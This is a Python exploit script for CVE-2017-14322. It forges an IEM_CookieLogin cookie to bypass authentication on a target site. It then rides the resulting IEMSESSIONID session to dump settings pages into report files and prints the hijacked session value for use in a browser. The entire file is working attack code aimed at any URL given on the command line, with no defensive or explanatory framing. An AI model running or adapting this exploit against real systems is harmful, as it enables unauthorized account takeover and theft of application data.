import requests
import sys
from bs4 import BeautifulSoup
from pprint import pprint
import os

def cookie_cutter(url):
    with requests.Session() as s:
       s.get(url)
       r = s.get(url)
       response_regex = r.text
       print("requesting initial Cookie\n")
       print(str(r.headers)+"\n")
       
       for key,value in s.cookies.items():
           if key and "IEMSESSIONID" in key:
          
              s.cookies.set('IEM_CookieLogin', "YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D")
       print("Attempting To Posion 2nd request with Forged Cookie\n")
       print("-" * 25)
       r = s.get(url)
       response_regex2 = r.text
       print response_regex2
       print(str(r.headers) + "\n")
       if response_regex != response_regex2:

          for key,value in s.cookies.items():
              if "IEMSESSIONID" in key:
                 try:
                    #using session riding from previous cookie we grab the info we want :)
                    bounce_info_grab(url,value)
                    app_info_grab(url,value)
                    privt_info_grab(url,value)
                 except:
                     pass
                 return value,r.text


def bounce_info_grab(url,session_to_ride):
    url_grab = url+"?Page=Settings&Tab=2"
    print(url_grab)
    with requests.Session() as s:
       s.get(url_grab)
       s.cookies.set('IEMSESSIONID',session_to_ride)
       r = s.get(url_grab)
       response_regex = r.text
       soup = BeautifulSoup(response_regex,'html5lib')
       div = soup.find('div', id='div7')
      
        
       outfile = open("bounce_report.txt",'w')
       dataout = """<html><head>Report</head><title>Report</title>
                    <body>""" + str(div) +"""</body></html>"""
       outfile.write(dataout)
       outfile.close()
       for divy in div.contents:
           print(divy)
          
def app_info_grab(url,session_to_ride):
    url_grab = url+"?Page=Settings&Tab=2"
    print(url_grab)
    with requests.Session() as s:
       s.get(url_grab)
       s.cookies.set('IEMSESSIONID',session_to_ride)
       r = s.get(url_grab)
       response_regex = r.text
       soup = BeautifulSoup(response_regex,'html5lib')
       div = soup.find('div', id='div1')
    
        
       outfile = open("application_settings_report.txt",'w')
       dataout = """<html><head>Report</head><title>Report</title>
                    <body>""" + str(div) +"""</body></html>"""
       outfile.write(dataout)
       outfile.close()
       for divy in div.contents:
           print(divy)   
    
def privt_info_grab(url,session_to_ride):
    url_grab = url+"?Page=Settings&Tab=2"
    print(url_grab)
    with requests.Session() as s:
       s.get(url_grab)
       s.cookies.set('IEMSESSIONID',session_to_ride)
       r = s.get(url_grab)
       response_regex = r.text
       soup = BeautifulSoup(response_regex,'html5lib')
       div = soup.find('div', id='div8')
     
        
       outfile = open("privtlbl_settings_report.txt",'w')
       dataout = """<html><head>Report</head><title>Report</title>
                    <body>""" + str(div) +"""</body></html>"""
       outfile.write(dataout)
       outfile.close()
       for divy in div.contents:
           print(divy)   
    
def main():
    url = sys.argv[1]
    print("Evaluating Target:" +url+ """ For CVE-2017-14322"""+"\n")
    print("-" * 25)
    try:
       session_rider_value,content = cookie_cutter(url)
       if session_rider_value:
          try:
             b = os.path.getsize("bounce_report.txt")
             if b < 1998:
                print(str(b) + "\n")
          
             else:
                 print("Session Has Been Generated Entering Internal Data Dumping Routine"+"\n")
                 print("-" * 25)
                 print("Magic Cookie Generated Modify Existing IEMSESSIONID Value In browser With Below Value ")
                 print("-" * 25)
                 print(session_rider_value+"\n")
                 print("-" * 25)
          except:
                pass
    except:
   
       print("Target Is Not Vulnerable ")
       sys.exit("FilE Size Mismatch! errors!")
   
    

main()
